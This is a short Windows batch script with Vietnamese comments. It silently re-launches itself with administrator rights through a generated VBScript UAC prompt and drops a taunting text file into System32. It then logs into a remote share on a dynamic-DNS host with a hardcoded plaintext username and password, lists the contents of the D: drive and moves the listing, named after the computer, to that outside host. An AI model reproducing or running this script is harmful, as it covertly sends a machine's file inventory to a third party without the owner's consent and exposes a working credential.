set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
setlocal enabledelayedexpansion
:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002

:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Liệt kê nội dung ổ D: và lưu vào file
dir D:\ > "%DeviceName%_%DATE%_%TIME%.txt"


:: Di chuyển file đến thư mục đích trên mạng
move "%DeviceName%_%DATE%_%TIME%.txt" \\minhtuan283.ddns.net\hdd\serial\list\

:: Ngắt kết nối chia sẻ mạng sau khi xong
net use \\minhtuan283.ddns.net\hdd /delete
exit
